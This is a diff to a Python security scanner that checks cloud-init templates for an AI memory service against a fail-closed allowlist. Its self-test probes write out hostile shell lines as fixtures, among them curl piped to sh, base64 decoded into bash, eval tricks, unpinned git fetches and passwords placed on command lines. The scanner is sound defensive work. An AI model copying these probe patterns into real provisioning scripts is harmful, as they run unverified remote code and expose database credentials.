+                faults.append("%s:%d: malformed pending head %r (want '<scope> #<issue>')" % (label, no, head))
+                continue
+            head, issue = hm.group(1), hm.group(2)
+        if head not in SCOPES:
+            faults.append("%s:%d: unknown scope %r" % (label, no, head))
+            continue
+        if ctx != ctx.strip() or " " in ctx:
+            faults.append("%s:%d: context %r is not one word" % (label, no, ctx))
+            continue
+        if line != norm(line):
+            faults.append("%s:%d: line is not whitespace-normalised" % (label, no))
+            continue
+        out.append((head, issue, ctx, line, no))
+    return out
+
+
+def scope_of(name: str) -> str:
+    return posixpath.basename(posixpath.dirname(name))
+
+
+def tf_render(text: str) -> str:
+    """What bash sees after terraform renders the template: ``$${`` is a
+    literal ``${``, ``%%{`` a literal ``%{``, a ``%{ }`` directive vanishes and
+    each ``${expr}`` becomes an operator-supplied value (a plain word here)."""
+    t = text.replace("$${", "\x00").replace("%%{", "\x01")
+    t = re.sub(r"%\{[^}]*\}", "", t)
+    t = re.sub(r"\$\{[^}]*\}", "TFVALUE", t)
+    return t.replace("\x00", "${").replace("\x01", "%{")
+
+
+def analyse(name: str, text: str, cache: dict):
+    key = (name, text)
+    if key not in cache:
+        lines, hits, entries, stmts = parse_template(name, text)
+        comp = []
+        for where, stmt, st in stmts:
+            for why in companion_hits(tf_render(stmt), st):
+                comp.append("%s: companion rule: %s" % (where, why))
+        homes = service_homes(lines)
+        trig = [ln for ln in lines if triggered(ln)]
+        cache[key] = (lines, hits + comp, entries, trig, homes)
+    return cache[key]
+
+
+def run_scan(templates: dict, maintfs: dict, allow_text: str, pending_text: str, known: set,
+             autolist: bool = False, extra=(), cache=None):
+    """Scan templates (name -> text). Returns (hits, faults, stats)."""
+    cache = {} if cache is None else cache
+    faults, hits = [], []
+    if len(templates) < 2:
+        faults.append("expected at least 2 templates, found %d" % len(templates))
+    scopes = {}
+    for nm in templates:
+        sc = scope_of(nm)
+        if sc in scopes:
+            faults.append("two templates in one directory: %s and %s" % (scopes[sc], nm))
+        scopes[sc] = nm
+    allow = load_entries(allow_text, False, faults, "allow")
+    pend = load_entries(pending_text, True, faults, "pending")
+    if not allow:
+        faults.append("allowlist is empty (fail closed)")
+    seen = {}
+    for e in allow + pend:
+        k = (e[0], e[2], e[3])
+        clash = [x for x in ((k,) + tuple((sc, e[2], e[3]) for sc in SCOPES if (sc == "both") != (e[0] == "both"))) if x in seen]
+        if clash:
+            faults.append("duplicate entry %s | %s | %s (also at %s)" % (e[0], e[2], e[3][:50], seen[clash[0]]))
+        seen[k] = "%s:%d" % ("pending" if e[1] else "allow", e[4])
+    approved = {(e[0], e[2], e[3]) for e in allow}
+    pending = {(e[0], e[2], e[3]) for e in pend}
+    approved |= {(s, c, t) for s, c, t in extra}
+    used = {}
+    ntrig = 0
+    for nm, text in sorted(templates.items()):
+        sc = scope_of(nm)
+        hits.extend(rules_1_to_4(nm, text, known))
+        for u in userdata_hits(nm, sc, text, maintfs.get(sc)):
+            (faults if u.startswith("FAULT:") else hits).append(u[6:] if u.startswith("FAULT:") else u)
+        lines, phits, entries, trig, homes = analyse(nm, text, cache)
+        binaries = {m.group(1) for m in (re.match(r"^\s*Exec\w*=\s*[-@+!:]*(/\S+)", x.joined) for x in lines if x.kind == "unit") if m}
+        hits.extend(phits)
+        if not trig:
+            faults.append("%s: zero triggered lines (fail closed)" % nm)
+        ntrig += len(trig)
+        sp = entries.get(STORE_URL_PATH)
+        if sp is not None and sp.get("permissions") != "'0600'":
+            hits.append("%s: %s has no permissions: '0600'" % (nm, STORE_URL_PATH))
+        for ln in trig:
+            keys = [(sc, ln.ctx, ln.text), ("both", ln.ctx, ln.text)]
+            hit_a = next((k for k in keys if k in approved), None)
+            hit_p = next((k for k in keys if k in pending), None)
+            if hit_a is None and hit_p is None:
+                if autolist:
+                    approved.add(keys[0])
+                    hit_a = keys[0]
+                else:
+                    hits.append("%s:%d: line not in the allowlist: %s | %s | %s" % (nm, ln.first, sc, ln.ctx, ln.text[:160]))
+                    continue
+            k = hit_a or hit_p
+            used.setdefault(k, set()).add(sc)
+            if hit_a is not None:
+                for why in validate_line(ln, homes, binaries):
+                    hits.append("%s:%d: %s" % (nm, ln.first, why))
+    for e in allow + pend:
+        k = (e[0], e[2], e[3])
+        need = set(scopes) if e[0] == "both" else {e[0]}
+        got = used.get(k, set())
+        if not need <= got:
+            what = "pending" if e[1] else "allow"
+            hits.append("%s:%d: stale entry (matches nothing in %s): %s | %s" % (what, e[4], ",".join(sorted(need - got)), e[2], e[3][:80]))
+    stats = {"templates": len(templates), "allow": len(allow), "pending": len(pend), "triggered": ntrig}
+    return hits, faults, stats
+
+
+def list_triggers(templates: dict, cache: dict) -> list:
+    out = []
+    for nm, text in sorted(templates.items()):
+        lines, _, _, trig, _ = analyse(nm, text, cache)
+        for ln in trig:
+            out.append("%s | %s | %s" % (scope_of(nm), ln.ctx, ln.text))
+    return out
+
+
+def load_repo():
+    templates = {}
+    for p in sorted(ROOT.glob(TEMPLATE_GLOB)):
+        templates[str(p.relative_to(ROOT))] = p.read_text(encoding="utf-8")
+    maintfs = {}
+    for nm in templates:
+        mt = ROOT / posixpath.dirname(nm) / "main.tf"
+        if mt.is_file():
+            maintfs[scope_of(nm)] = mt.read_text(encoding="utf-8")
+    allow = ALLOW_FILE.read_text(encoding="utf-8") if ALLOW_FILE.is_file() else ""
+    pend = PENDING_FILE.read_text(encoding="utf-8") if PENDING_FILE.is_file() else ""
+    return templates, maintfs, allow, pend
+
+
 def build_parser() -> argparse.ArgumentParser:
-    ap = argparse.ArgumentParser(description="#4616 cloud-init memory templates must start a daemon that can boot")
-    ap.add_argument("--self-test", action="store_true", help="prove the rules are red on probes and green on clean lines")
+    ap = argparse.ArgumentParser(description="#4616/#4657 cloud-init memory templates: fail-closed token allowlist")
+    g = ap.add_mutually_exclusive_group()
+    g.add_argument("--self-test", action="store_true", help="prove the rules are red on probes and green on clean lines")
+    g.add_argument("--list-triggers", action="store_true", help="print every triggered line as an allowlist entry")
     return ap
 
 
-def mutate(text: str, old: str, new: str) -> str:
-    """Replace ``old`` with ``new`` or fail loudly: a probe built from the real
-    template must not silently stop mutating it when the template changes."""
-    if old not in text:
-        raise RuntimeError("self-test fixture drift: %r not found in the AWS template" % old[:60])
-    return text.replace(old, new, 1)
-
-
+# ---------------------------------------------------------------- self-test
 # Built by concatenation so this file carries no literal flag-plus-DSN (#4577 gate).
 SU = "--store-" + "url"
+PG = "postgres" + "://"
+PW = "ProbePlaceholder1"
+BIN = "/usr/local/lib/ai-memory/bin/ai-memory"
+PROV_PATH = "/usr/local/sbin/ai-memory-provision.sh"
+UNIT_PATH = "/etc/systemd/system/ai-memory.service"
+EXEC = "ExecStart=" + BIN + " serve --host 0.0.0.0"
+ENVF = "      Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n"
+PROV = "  - path: " + PROV_PATH + "\n"
+UNIT_ENTRY = "  - path: " + UNIT_PATH + "\n"
+EXT = "      sudo -u postgres psql -d aimemory -c \"CREATE EXTENSION IF NOT EXISTS vector;\"\n"
+RELOAD = "      systemctl daemon-reload\n"
+CHMOD = "      chmod 0600 /etc/ai-memory/store-url\n"
+AGE = "        fetch_pinned https://github.com/apache/age.git /opt/age-src \"$AGE_COMMIT\"\n"
+PIN = "AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4"
+DSNFILE = PG + "aimemory:CHANGEME@localhost/aimemory?sslmode=verify-full&sslrootcert=/etc/ai-memory/tls/pg-ca.crt"
+DSN = PG + "aimemory:" + PW + "@localhost/aimemory?sslmode=verify-full"
+NOPW = PG + "aimemory@localhost/aimemory?sslmode=verify-full"
+RUNCMD = "  - [bash, " + PROV_PATH + "]\n"
+STORE_PERM = "  - path: /etc/ai-memory/store-url\n    permissions: '0600'\n"
+
+
+def wf(path, mode, body):
+    """A write_files entry inserted before the provision script entry."""
+    out = ["  - path: " + path, "    permissions: '" + mode + "'", "    content: |"] + ["      " + b for b in body]
+    return "\n".join(out) + "\n" + PROV
+
+
+def ins(anchor, lines, before=False):
+    """Insert provision-script lines (6-space indent) after (or before) anchor."""
+    block = "".join("      " + x + "\n" for x in lines)
+    return (anchor, block + anchor) if before else (anchor, anchor + block)
+
+
+def build_probes() -> list:
+    """(label, expect, spec). expect: red (a defect hit), green, fault (rc 2).
+    spec keys: aws/do (mutations), autolist, extra, allow/pend (text edits),
+    templates (replace the set), maintf (aws main.tf text)."""
+    P = []
+
+    def red(label, muts, autolist=True, **kw):
+        P.append((label, "red", dict(aws=muts, autolist=autolist, **kw)))
+
+    def green(label, muts, autolist=False, **kw):
+        P.append((label, "green", dict(aws=muts, autolist=autolist, **kw)))
+
+    # ---- security reviewer round 1 (#4662/#4663/#4664) and round 2 (#4687-#4693)
+    red("S-R1 runtime argv via sh -c", [(EXEC, "ExecStart=/bin/sh -c 'exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" --host 0.0.0.0'")])
+    red("S-R2 password= query on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + NOPW.replace("?", "?password=" + PW + "&")))])
+    red("S-R3 Environment= DSN in a 0644 unit", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + DSN + "\n")])
+    red("S-R4 psql DSN on the argv in provision", [ins(EXT, ["psql \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\" -c \"SELECT 1\""])])
+    red("S-R5 literal userinfo DSN on serve", [(EXEC, EXEC.replace("serve", "serve " + SU + " " + DSN))])
+    red("S-N1 EnvironmentFile holding AI_MEMORY_STORE_URL=", [(PROV, wf("/etc/ai-memory/env", "0600", ["AI_MEMORY_STORE_URL=" + DSN]))])
+    red("S-N2 AI_MEMORY_STORE_URL with a space before = (#4689)", [(PROV, wf("/etc/default/ai-memory", "0644", ["AI_MEMORY_STORE_URL =" + DSN]))])
+    red("S-N3 drop-in ExecStart with the store flag", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-store.conf", "0644", ["[Service]", "ExecStart=", EXEC + " --port 9077 --tls-cert /a --tls-key /b " + SU + " " + DSN]))])
+    red("S-N4 drop-in Environment=PGPASSWORD (#4687)", [(PROV, wf("/etc/systemd/system/ai-memory.service.d/10-pw.conf", "0644", ["[Service]", "Environment=PGPASSWORD=" + PW]))])
+    red("S-N5 unit Environment=PGPASSWORD (#4687)", [(ENVF, ENVF + "      Environment=PGPASSWORD=" + PW + "\n")])
+    red("S-N6 wrapper script the unit executes", [(PROV, wf("/usr/local/bin/ai-memory-run", "0755", ["#!/bin/sh", "exec " + BIN + " serve " + SU + " \"$(cat /etc/ai-memory/store-url)\" \"$@\""]))])
+    red("S-N7 wrapper at the binary path, flag split by a variable (#4693)", [ins(RELOAD, ["printf '%s\\n' '#!/bin/sh' 'F=--store' 'exec " + BIN + ".real \"$@\" \"$F-url\" \"$(cat /etc/ai-memory/store-url)\"' > " + BIN], before=True)])
+    red("S-N8 systemd-run serve with the store flag", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 " + SU + " \"$(cat /etc/ai-memory/store-url)\""], before=True)])
+    red("S-N9 systemd-run, store flag split by quoting (#4693)", [ins(RELOAD, ["systemd-run --uid=aimemory " + BIN + " serve --host 127.0.0.1 --sto\"re-u\"rl \"$(cat /etc/ai-memory/store-url)\""], before=True)])
+    red("S-N10 ExecStart store flag split by quoting", [(EXEC, EXEC.replace("serve", "serve --sto\"re-u\"rl /x"))])
+    red("S-N11 ExecStart unbraced $VAR argument list", [(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("serve", "serve $$STORE_ARGS"))])
+    P.append(("S-N12 braced $${VAR} as a --host value (benign)", "green", dict(aws=[(ENVF, ENVF + "      EnvironmentFile=/etc/ai-memory/args\n"), (EXEC, EXEC.replace("--host 0.0.0.0", "--host $${H}"))], autolist=True, core=True)))
+    red("S-N13 pg_isready -d DSN", [ins(EXT, ["pg_isready -d \"" + PG + "aimemory:$DB_PASS@localhost/aimemory?sslmode=verify-full\""])])
+    red("S-N14 pg_dump --dbname=DSN (#4690)", [ins(EXT, ["pg_dump --dbname=" + PG + "aimemory:$${DB_PASS}@localhost/aimemory?sslmode=verify-full -f /dev/null"])])
+    red("S-N15 psql percent-encoded pass%77ord= key (#4691)", [ins(EXT, ["psql \"" + PG + "aimemory@localhost/aimemory?sslmode=verify-full&pass%77ord=$DB_PASS\" -c \"SELECT 1\""])])
+    red("S-N16 psql keyword conninfo password= (#4692)", [ins(EXT, ["psql \"host=localhost dbname=aimemory user=aimemory password=$DB_PASS sslmode=verify-full\" -c \"SELECT 1\""])])
+    red("S-N17 lax-permission opt-out with a 0644 store-url (#4688)", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n"), (CHMOD, CHMOD.replace("0600", "0644"))])
+    # ---- code reviewer round 1 and round 2 (#4657, #4682-#4685)
+    red("C-R1 git -C checkout of a branch", [(AGE, "        git init -q /opt/age-src && git -C /opt/age-src remote add origin https://github.com/apache/age.git\n        git -C /opt/age-src fetch -q origin release/PG18/1.8.0\n        git -C /opt/age-src checkout -q FETCH_HEAD\n")], autolist=False)
+    red("C-R1 fetch_pinned without rev-parse", [("          && [ \"$(git -C \"$2\" rev-parse HEAD)\" = \"$3\" ] \\\n", "")], autolist=False)
+    red("C-R1 fetch_pinned with a branch literal", [("\"$AGE_COMMIT\"", "release/PG18/1.8.0")], autolist=False)
+    red("C-R1 weak DSN through Environment=", [(ENVF, "      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory:x@localhost/aimemory\n")])
+    red("C-R1 unknown short flag", [("serve --host 0.0.0.0", "serve -b 0.0.0.0:9077 --host 0.0.0.0")])
+    red("C-R1 systemd ${VAR} serve argument", [("--port 9077", "--port 9077 $${EXTRA_SERVE_FLAGS}")])
+    red("C-N01 git through a variable", [ins(AGE, ["  GIT=git; $GIT -C /opt/age-src fetch -q origin master && $GIT -C /opt/age-src checkout -q FETCH_HEAD"])])
+    red("C-N02 git through an alias", [ins(AGE, ["  shopt -s expand_aliases; alias g=git", "  g -C /opt/age-src fetch -q origin master"])], autolist=False)
+    red("C-N03 git by absolute path", [(AGE, "        /usr/bin/git clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
+    red("C-N04 quoted git clone", [(AGE, "        \"git\" clone -q https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
+    red("C-N05 git clone --branch", [(AGE, "        git clone -q --branch master https://github.com/apache/age.git /opt/age-src\n")], autolist=False)
+    red("C-N06 curl piped to a shell (#4682)", [ins(AGE, ["  curl -fsSL https://example.invalid/install.sh | sh"])])
+    red("C-N07 moving tarball through curl|tar (#4682)", [(AGE, "        mkdir -p /opt/age-src && curl -fsSL https://github.com/apache/age/archive/refs/heads/master.tar.gz | tar -xz -C /opt/age-src --strip-components=1\n")])
+    red("C-N08 fetch_pinned with a short ref", [("\"$AGE_COMMIT\"", "e43dc1a")], autolist=False)
+    red("C-N09 short AGE_COMMIT", [(PIN, "AGE_COMMIT=e43dc1a")], autolist=False)
+    red("C-N10 non-hex AGE_COMMIT", [(PIN, "AGE_COMMIT=" + "g" * 40)], autolist=False)
+    red("C-N11 pin read from the network (#4683)", [ins(AGE, ["  read -r AGE_COMMIT < <(curl -fsS https://example.invalid/head)"], before=True)], autolist=False)
+    red("C-N12 pin through printf -v (#4683)", [ins(AGE, ["  printf -v AGE_COMMIT %s \"$(curl -fsS https://example.invalid/head)\""], before=True)], autolist=False)
+    red("C-N13 pin through += (#4683)", [ins(AGE, ["  AGE_COMMIT+=x"], before=True)], autolist=False)
+    red("C-N14 fetch_pinned redefined", [ins(AGE, ["  fetch_pinned() { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
+    red("C-N15 fetch_pinned redefined with function", [ins(AGE, ["  function fetch_pinned { git clone \"$1\" \"$2\"; }"], before=True)], autolist=False)
+    red("C-N16 fetch_pinned shadowed by an alias", [ins(AGE, ["  alias fetch_pinned=true"], before=True)], autolist=False)
+    red("C-N17 serve line built by printf in sh -c", [(EXEC, "ExecStart=/bin/sh -c \"$(printf '%s serve --bind 0.0.0.0:9077' " + BIN + ")\"")])
+    red("C-N18 serve line hidden behind eval", [(EXEC, "ExecStart=/bin/sh -c 'eval \"$CMD\"'")])
+    red("C-N19 drop-in through a heredoc", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "cat > /etc/systemd/system/ai-memory.service.d/10-x.conf <<'UNIT'", "[Service]", "ExecStart=", "ExecStart=" + BIN + " serve --bind 0.0.0.0:9077", "UNIT"], before=True)], autolist=False)
+    red("C-N20 drop-in through a printf one-liner (#4684)", [ins(RELOAD, ["mkdir -p /etc/systemd/system/ai-memory.service.d", "printf '[Service]\\nExecStart=\\nExecStart=" + BIN + " serve --bind 0.0.0.0:9077\\n' > /etc/systemd/system/ai-memory.service.d/10-x.conf"], before=True)], autolist=False)
+    red("C-N21 EnvironmentFile carrying AI_MEMORY_STORE_URL", [(UNIT_ENTRY, "  - path: /etc/ai-memory/env\n    permissions: '0600'\n    content: |\n      AI_MEMORY_STORE_URL=" + NOPW + "\n" + UNIT_ENTRY)])
+    red("C-N22 drop-in by a write_files entry", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      ExecStart=\n      ExecStart=" + BIN + " serve --bind 0.0.0.0:9077 --tls-cert /a --tls-key /b\n" + UNIT_ENTRY)])
+    red("C-N23 drop-in with a weak Environment URL", [(UNIT_ENTRY, "  - path: /etc/systemd/system/ai-memory.service.d/override.conf\n    content: |\n      [Service]\n      Environment=AI_MEMORY_STORE_URL=" + PG + "aimemory@localhost/aimemory\n" + UNIT_ENTRY)])
+    red("C-N24 trailing blanks after a continuation backslash", [("--port 9077 ", "--port 9077 \\   \n        --bind 0.0.0.0:9077 ")])
+    red("C-N25 SSLMODE upper-case key (#4685)", [(DSNFILE, DSNFILE.replace("sslmode=", "SSLMODE="))])
+    red("C-N26 percent-encoded key override ssl%6Dode=disable (#4685)", [(DSNFILE, DSNFILE + "&ssl%6Dode=disable")])
+    red("C-N27 percent-encoded sslmode value", [(DSNFILE, DSNFILE.replace("verify-full", "verify%2Dfull"))])
+    red("C-N28 trailing weak sslmode", [(DSNFILE, DSNFILE + "&sslmode=require")])
+    red("C-N30 unknown launcher before serve", [(EXEC, EXEC.replace("ExecStart=/usr", "ExecStart=/usr/bin/nice -n 5 /usr"))])
+    red("C-N31 postgresql:// with sslmode=require", [(DSNFILE, DSNFILE.replace(PG, "postgresql://").replace("verify-full", "require"))])
+    # ---- condition 6: trigger matching
+    red("T6 case-varied trigger word", [ins(RELOAD, ["echo PoStGrEs"])], autolist=False)
+    red("T6 percent-encoded trigger word", [ins(RELOAD, ["echo p%6Fstgres"])], autolist=False)
+    green("T6 untriggered plain line", [ins(RELOAD, ["echo hello"])])
+    red("T6 sslmode=Verify-Full", [(DSNFILE, DSNFILE.replace("verify-full", "Verify-Full"))])
+    red("T6 sslmode missing", [(DSNFILE, DSNFILE.replace("sslmode=verify-full&", ""))])
+    # ---- condition 2: companion rule
+    for lbl, cmd in (("eval", "eval \"$X\""), ("base64 decode into a shell", "echo Zm9v | base64 -d | bash"),
+                     ("base64 decode then a shell in one statement", "echo Zm9v | base64 -d > /x && bash /x"),
+                     ("xxd -r then a shell in one statement", "xxd -r -p /y > /x; sh /x"),
+                     ("ANSI-C quoting", "$'\\x63url' https://e"), ("$-variable in command position", "$X -fsSL https://e"),
+                     ("command substitution in command position", "$(printf cu)rl https://e"),
+                     ("backtick in command position", "`printf cu`rl https://e"),
+                     ("sudo wrapper of a variable", "sudo -u aimemory $X"), ("env wrapper of a variable", "env A=1 $X"),
+                     ("runuser -c expanded script", "runuser -u aimemory -- bash -c \"$X\""),
+                     ("here-string into bash", "bash <<< \"$X\""), ("process substitution into bash", "bash <(curl -fsS https://e)"),
+                     ("source of a substitution", "source <(curl -fsS https://e)"), ("pipe into python", "curl -fsS https://e | python3"),
+                     ("nested sh -c eval", "sh -c 'eval x'"), ("timeout wrapper of a variable", "timeout 5 $X"),
+                     ("xargs into a shell", "echo x | xargs sh"), ("unparsable quote", "echo \"$(foo")):
+        red("C2 companion: " + lbl, [ins(RELOAD, [cmd], before=True)])
+    red("C2 companion in a runcmd flow list", [(RUNCMD, RUNCMD + "  - [bash, -c, \"eval $X\"]\n")])
+    red("C2 companion in a runcmd string item", [(RUNCMD, RUNCMD + "  - $X -fsSL https://e\n")])
+    red("C2 companion in an unquoted heredoc substitution", [ins(RELOAD, ["cat > /etc/x.conf <<EOF", "a=$(eval x)", "EOF"], before=True)])
+    green("C2 quoted heredoc body is data", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "a=$(eval x)", "EOF"], before=True)], autolist=True, core=True)
+    # ---- validators
+    red("V store-url permissions '0644'", [(STORE_PERM, STORE_PERM.replace("0600", "0644"))])
+    red("V store-url permissions line removed", [(STORE_PERM, "  - path: /etc/ai-memory/store-url\n")])
+    red("V chmod of the store-url to 0640", [(CHMOD, CHMOD.replace("0600", "0640"))])
+    red("V write_files encoding: b64", [(STORE_PERM, STORE_PERM + "    encoding: b64\n")])
+    red("V write_files !!binary content", [(PROV, "  - path: /etc/x\n    content: !!binary |\n      eA==\n" + PROV)])
+    red("V write_files source: uri", [(PROV, "  - path: /etc/x\n    source:\n      uri: https://e/x\n" + PROV)])
+    red("V curl failure ignored", [ins(RELOAD, ["curl -fsSL https://e -o /x || true"])])
+    red("V tar extract failure ignored", [ins(RELOAD, ["tar -xzf /x -C /y || true"])])
+    red("V unit binary in the service home", [(EXEC, EXEC.replace(BIN, "/opt/ai-memory/bin/ai-memory"))])
+    red("V redirect writes the unit binary", [ins(RELOAD, ["printf x > " + BIN], before=True)])
+    red("V tee writes the unit binary", [ins(RELOAD, ["printf x | tee " + BIN], before=True)])
+    red("V password= in a unit", [(ENVF, ENVF + "      Environment=DB_ARGS=password=" + PW + "\n")])
+    red("V SQL PASSWORD literal on a psql argv", [ins(EXT, ["sudo -u postgres psql -c \"ALTER USER aimemory WITH PASSWORD '" + PW + "';\""])])
+    red("V terraform secret into user-data", [ins(EXT, ["echo \"${db_password}\" > /etc/x"])])
+    red("V AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS alone", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n")])
+    red("V PGPASSFILE in provision", [ins(EXT, ["export PGPASSFILE=/root/.pgpass"])])
+    # ---- structure
+    red("Y write_files entry not led by path", [(PROV, "  - permissions: '0644'\n    path: /etc/x\n" + PROV)], autolist=False)
+    red("Y folded content scalar", [(PROV, "  - path: /etc/x\n    content: >\n      curl https://e\n" + PROV)])
+    red("Y runcmd block-scalar item", [(RUNCMD, RUNCMD + "  - |\n    curl https://e | sh\n")])
+    red("Y runcmd item spanning lines", [(RUNCMD, RUNCMD + "  - \"curl\n    https://e\"\n")])
+    red("Y unterminated heredoc", [ins(RELOAD, ["cat > /etc/x <<EOF", "a"], before=True)])
+    red("Y tab in YAML indentation", [(RUNCMD, RUNCMD + "\t- [true]\n")])
+    # ---- condition 5: normalisation and comments
+    green("C5 extra blanks inside a listed line", [(RELOAD, "      systemctl    daemon-reload   \n")])
+    green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
+    green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
+    green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
+    red("C5 comment inside a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "# curl https://e | sh", "EOF"], before=True)],
+        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
+    red("C5 comment inside an open multi-line quote", [ins(RELOAD, ["X=\"a", "# curl https://e | sh", "b\""], before=True)], autolist=False)
+    red("C5 comment after a continuation", [ins(RELOAD, ["echo a \\", "# curl https://e | sh"], before=True)], autolist=False)
+    # ---- condition 4: unlisted token lines
+    red("C4 unlisted runcmd line", [(RUNCMD, RUNCMD + "  - [curl, -o, /x, https://e]\n")], autolist=False)
+    red("C4 unlisted line in write_files data", [(DSNFILE + "\n", DSNFILE + "\n      x https://e\n")], autolist=False)
+    red("C4 unlisted line in a unit", [(ENVF, ENVF + "      ExecStartPre=/bin/true\n")], autolist=False)
+    red("C4 unlisted line in the embedded script", [ins(RELOAD, ["bash -c 'curl https://e'"], before=True)], autolist=False)
+    red("C4 unlisted line in a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "curl https://e", "EOF"], before=True)],
+        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
+    # ---- rules 1-4 and user-data
+    red("R1 non-ASCII byte", [(RELOAD, "      systemctl daemon-reload —\n")], autolist=False)
+    red("R2 no serve ExecStart", [(EXEC, "ExecStart=" + BIN + " mcp")])
+    red("R4 missing --tls-key", [(" --tls-key /etc/ai-memory/tls/node.key", "")])
+    red("U AWS main.tf without base64gzip (#4703)", [], maintf_sub=("user_data_base64 = base64gzip(templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\"", "user_data = (templatefile(\"${path.module}/cloud-init-memory.yaml.tpl\""))
+    red("U gzip over the limit (#4703)", [(RELOAD, RELOAD + "".join("      # %s\n" % hashlib.sha256(b"%d" % k).hexdigest() for k in range(400)))])
+    P.append(("U do-hive over 64 KiB without gzip", "red", dict(do=[("runcmd:\n", "".join("# %s\n" % hashlib.sha512(b"%d" % k).hexdigest() for k in range(520)) + "runcmd:\n")], autolist=True, core=True)))
+    P.append(("U template with no known limit", "fault", dict(add_template=("infra/other/cloud-init-memory.yaml.tpl", None))))
+    # ---- condition 3: allowlist form
+    P.append(("A malformed entry", "fault", dict(allow_add="both | only-two-fields")))
+    P.append(("A unknown scope", "fault", dict(allow_add="gcp | top | runcmd:")))
+    P.append(("A non-normalised entry", "fault", dict(allow_add="both | top | runcmd:  x")))
+    P.append(("A duplicate entry", "fault", dict(allow_dup=True)))
+    P.append(("A entry in both allow and pending", "fault", dict(pend_dup=True)))
+    P.append(("A malformed pending head", "fault", dict(pend_add="do-hive 4671 | top | x")))
+    P.append(("A empty allowlist", "fault", dict(allow_text="# only a comment\n")))
+    P.append(("A stale entry", "red", dict(allow_add="aws-gpu-burst | top | nothing-matches:", autolist=False)))
+    P.append(("A stale both entry (one template only)", "red", dict(allow_add="both | " + PROV_PATH + " | echo only-in-aws > /x", aws=[ins(RELOAD, ["echo only-in-aws > /x"], before=True)], autolist=False)))
+    P.append(("A stale pending entry", "red", dict(pend_add="do-hive #4671 | top | nothing-matches:", autolist=False)))
+    P.append(("A fewer than two templates", "fault", dict(drop_do=True)))
+    P.append(("A two templates in one directory", "fault", dict(add_template=("infra/aws-gpu-burst/cloud-init-memory-2.yaml.tpl", "aws"))))
+    P.append(("A template with zero triggered lines", "fault", dict(do_text="")))
+    P.append(("A real templates (green control)", "green", dict(autolist=False)))
+    return P
+
+
+def apply_muts(text: str, muts) -> str:
+    for old, new in muts:
+        if old not in text:
+            raise RuntimeError("self-test fixture drift: %r not in the template" % old[:60])
+        text = text.replace(old, new, 1)
+    return text
+
+
+def case_inputs(base: tuple, spec: dict):
+    """Return run_scan arguments for one probe spec."""
+    templates, maintfs, allow, pend = base
+    t = dict(templates)
+    t[AWS_TEMPLATE] = apply_muts(t[AWS_TEMPLATE], spec.get("aws", ()))
+    t[DO_TEMPLATE] = apply_muts(t[DO_TEMPLATE], spec.get("do", ()))
+    if "do_text" in spec:
+        t[DO_TEMPLATE] = spec["do_text"]
+    if spec.get("drop_do"):
+        del t[DO_TEMPLATE]
+    if "add_template" in spec:
+        nm, src = spec["add_template"]
+        t[nm] = templates[AWS_TEMPLATE] if src == "aws" else templates[AWS_TEMPLATE]
+    mt = dict(maintfs)
+    if "maintf_sub" in spec:
+        old, new = spec["maintf_sub"]
+        if old not in mt["aws-gpu-burst"]:
+            raise RuntimeError("self-test fixture drift in aws main.tf")
+        mt["aws-gpu-burst"] = mt["aws-gpu-burst"].replace(old, new, 1)
+    a = spec.get("allow_text", allow)
+    if "allow_add" in spec:
+        a = a + spec["allow_add"] + "\n"
+    first = next(x for x in allow.splitlines() if x and not x.startswith("#"))
+    if spec.get("allow_dup"):
+        a = a + first + "\n"
+    p = pend
+    if spec.get("pend_dup"):
+        p = p + first.split(" | ", 1)[0] + " #4671 | " + first.split(" | ", 1)[1] + "\n"
+    if "pend_add" in spec:
+        p = p + spec["pend_add"] + "\n"
+    return t, mt, a, p, spec.get("autolist", False), spec.get("extra", ())
+
+
+def verdict(hits: list, faults: list, spec: dict) -> str:
+    if faults:
+        return "fault"
+    core = [h for h in hits if "stale entry" not in h and "not in the allowlist" not in h] if spec.get("autolist") or spec.get("core") else hits
+    return "red" if core else "green"
+
+
+def entry_mutations(base: tuple, cache: dict) -> list:
+    """Condition 4: for every allow entry, a template whose first matching line
+    has ' #m' appended to its last physical line."""
+    templates, _, allow, _ = base
+    out = []
+    by_scope = {scope_of(nm): nm for nm in templates}
+    for raw in allow.splitlines():
+        if not raw or raw.startswith("#"):
+            continue
+        sc, ctx, line = raw.split(" | ", 2)
+        nm = by_scope["aws-gpu-burst" if sc == "both" else sc]
+        lines, _, _, trig, _ = analyse(nm, templates[nm], cache)
+        ln = next((x for x in trig if x.ctx == ctx and x.text == line), None)
+        if ln is None:
+            raise RuntimeError("self-test: allow entry matches nothing: " + raw[:80])
+        phys = templates[nm].split("\n")
